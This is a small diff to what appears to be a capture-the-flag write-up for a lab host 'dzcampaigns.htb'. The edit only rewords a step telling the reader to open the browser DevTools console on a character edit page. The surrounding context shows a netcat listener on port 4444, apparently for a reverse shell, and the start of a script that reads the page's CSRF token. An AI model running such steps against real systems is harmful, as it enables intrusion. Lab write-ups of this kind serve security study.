@@ -80,9 +80,7 @@ Start a listener on Kali:
 nc -lvnp 4444
 ```
 
-Then in Console At `http://dzcampaigns.htb/character/15/edit` → DevTools → Console::
-
-javascript
+Then at `http://dzcampaigns.htb/character/15/edit` → DevTools → Console:
 
 ```javascript
 const csrf = document.querySelector('[name="_csrf"]').value;
